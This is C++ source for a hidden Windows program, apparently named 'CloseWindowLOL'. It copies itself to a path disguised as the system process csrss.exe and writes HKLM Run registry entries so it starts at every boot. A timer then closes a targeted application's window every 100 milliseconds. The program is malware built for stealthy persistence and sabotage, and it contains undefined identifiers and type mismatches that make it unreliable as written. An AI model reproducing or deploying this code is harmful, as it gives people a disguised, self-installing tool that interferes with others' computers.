#include <windows.h>
#include <cstdlib>
#include <cstring>
#include <iostream>

const int Time = 1;
LRESULT CALLBACK WndProc(HWND hwnd,UINT Message,WPARAM wParam,LPARAM lParam);

int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
	WNDCLASSEX wc;
	HWND hwnd;
	MSG msg;

	memset(&wc,0,sizeof(wc));
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.lpfnWndProc = WndProc;
	wc.hInstance = hInstance;
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
	wc.lpszClassName = "CloseWindowLOL";
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	if(!RegisterClassEx(&wc))
	{
		MessageBox(NULL,"Window Registration Failed!","Error!",MB_ICONEXCLAMATION|MB_OK);
		return 0;
	}

	hwnd = CreateWindowEx(WS_EX_CLIENTEDGE,"CloseWindowLOL","CloseWindowLOL",NULL,CW_USEDEFAULT,CW_USEDEFAULT,0,0,NULL,NULL,hInstance,NULL);
		
	if(hwnd == NULL)
	{
		MessageBox(NULL,"Window Creation Failed!","Error!",MB_ICONEXCLAMATION|MB_OK);
		return 0;
	}

	while(GetMessage(&msg,NULL,0,0) > 0)
	{ 
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hwnd,UINT Message,WPARAM wParam,LPARAM lParam)
{
	static HWND hWILLBeClosed = 0x0;
	static HWND hDialog;
	static TCHAR Filename[1001];
	static TCHAR TargetFilename[1001] = "D:\\Windowsexs\\csrss.exe";
	static TCHAR Command[1001] = "echo f | xcopy ";
	static HKEY hKey;
	switch(Message)
	{
		case WM_TIMER:
		{
			if(wParam == Time)
			{
				//Use SPY++ to find the name of windows class
				//to be set and added
				
				hWILLBeClosed = FindWindowW(FILENAME,NULL);
				if(hWILLBeClosed)
				{
					SendMessage(hWILLBeClosed,WM_CLOSE,0,0);
				}
			}
			break;
		}
		
		case WM_CREATE:	
		{	  
			//check  if it is WOW64
			BOOL isWOW64;  
			REGSAM P;  
			IsWow64Process(GetCurrentProcess(),&isWOW64);  
			if (isWOW64)
			{  
				P = KEY_WRITE | KEY_WOW64_64KEY;  
			}
			else
			{  
				P = KEY_WRITE;  
			}
			GetModuleFileName(0,Filename,100);
			if(strcmp(TargetFilename,Filename) == 0)
			{
				SetTimer(hwnd,Time,100,NULL);
				break;
			}
			RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,NULL,0,P,NULL,&hKey,NULL);
			RegDeleteKeyEx(hKey,"COWindow",P,0); 
			RegSetValueEx(hKey,"COWindow",0,REG_SZ,(CONST BYTE*)TargetFilename,sizeof(TargetFilename)*sizeof(TCHAR));
			RegCloseKey(hKey);
			
			strcat(Command,Filename);
			strcat(Command," ");
			strcat(Command,TargetFilename);
			strcat(Command," ");
			strcat(Command,"/Y");
			int res = system(Command);
			
			//if it is failed to copy exe file
			//then put it's own filepath into setup
			if(res != 0)
			{
				RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,NULL,0,P,NULL,&hKey,NULL);
				RegDeleteKeyEx(hKey,"COWindow2",P,0); 
				RegSetValueEx(hKey,"COWindow2",0,REG_SZ,(CONST BYTE*)Filename,sizeof(Filename)*sizeof(TCHAR));
				RegCloseKey(hKey);
				SetTimer(hwnd,Time,100,NULL);
			}
			break; 
		}
		
		case WM_DESTROY:
		{
			PostQuitMessage(0);
			break;
		}

		default:
			return DefWindowProc(hwnd,Message,wParam,lParam);
	}
	return 0;
}
